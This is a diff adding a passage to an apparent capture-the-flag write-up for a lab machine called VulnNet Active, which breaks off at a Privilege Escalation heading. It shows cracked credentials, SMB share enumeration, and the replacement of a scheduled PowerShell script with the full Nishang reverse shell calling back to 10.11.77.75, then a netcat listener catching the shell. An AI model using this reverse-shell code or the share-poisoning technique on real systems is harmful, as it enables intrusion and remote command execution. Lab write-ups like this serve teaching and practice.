@@ -486,3 +486,219 @@ Now used ```hashcat``` to crack the hash ```NTLMv2-SSP```  and the password is `
 root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
 ENTERPRISE-SECURITY::VULNNET:1fecd174d12475d0:d6bfd2513d1d201258d7758a41613f4d:010100000000000000a98a38d197d801a4b5c9e89e17e4bc0000000002000800450042004100300001001e00570049004e002d00350044003100510045004c003900530038003600590004003400570049004e002d00350044003100510045004c00390053003800360059002e0045004200410030002e004c004f00430041004c000300140045004200410030002e004c004f00430041004c000500140045004200410030002e004c004f00430041004c000700080000a98a38d197d8010600040002000000080030003000000000000000000000000030000070aba81c0ed9f950cdab0f5aa7fc26641cd000f18fbef824f885525dd45fecc60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00370037002e00370035000000000000000000:sand_0873959498
 ```
+
+Further proceeding with SMB enumeration....
+
+#### **SMB**
+
+SMB enumeration with the credentials got from the ```enterprise-security``` | ```sand_0873959498```
+
+```shell
+root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# smbclient -L \\\\active.thm\\ -U enterprise-security
+Password for [WORKGROUP\enterprise-security]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Enterprise-Share Disk
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to active.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+
+while enumerating with the user we got some share like ```Enterprise-Share```
+
+```shell
+root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# smbclient \\\\active.thm\\Enterprise-Share -U enterprise-security
+Password for [WORKGROUP\enterprise-security]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Feb 24 04:15:41 2021
+  ..                                  D        0  Wed Feb 24 04:15:41 2021
+  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021
+
+                9558271 blocks of size 4096. 5004678 blocks available
+smb: \> get PurgeIrrelevantData_1826.ps1
+getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+```
+
+#### **SMB Reverse-Shell**
+
+contents in that file  ```PurgeIrrelevantData_1826.ps1```
+
+```powershell
+rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
+```
+
+So, now need to get the reverse shell modifying that file will help in getting reverse shell.
+
+Download -> https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+```powershell
+function Invoke-PowerShellTcp 
+{ 
+<#
+.SYNOPSIS
+Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
+
+.DESCRIPTION
+This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
+Also, a standard netcat can connect to this script Bind to a specific port.
+
+The script is derived from Powerfun written by Ben Turner & Dave Hardy
+
+.PARAMETER IPAddress
+The IP address to connect to when using the -Reverse switch.
+
+.PARAMETER Port
+The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+
+Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
+the given IP and port. 
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Bind -Port 4444
+
+Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+
+Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
+listening on the given IP and port. 
+
+.LINK
+http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
+https://github.com/nettitude/powershell/blob/master/powerfun.ps1
+https://github.com/samratashok/nishang
+#>      
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+
+    )
+
+    
+    try 
+    {
+        #Connect back if the reverse switch is used.
+        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        #Bind to the provided port if Bind switch is used.
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            #Return the results
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.11.77.75 -Port 4444
+```
+
+After modifying the contents in the file upload the file using SMB,
+
+```shell
+smb: \> put PurgeIrrelevantData_1826.ps1
+putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (8.0 kb/s) (average 8.0 kb/s)
+```
+
+And run netcat listener to get the reverse shell
+
+```shell
+root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.11.77.75] from (UNKNOWN) [10.10.84.115] 50029
+Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+ls
+
+
+    Directory: C:\Users\enterprise-security\Downloads
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad
+d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402
+-a----        2/26/2021  10:37 AM            143 startup.bat
+
+
+PS C:\Users\enterprise-security\Downloads>
+```
+
+### Privilege Escalation
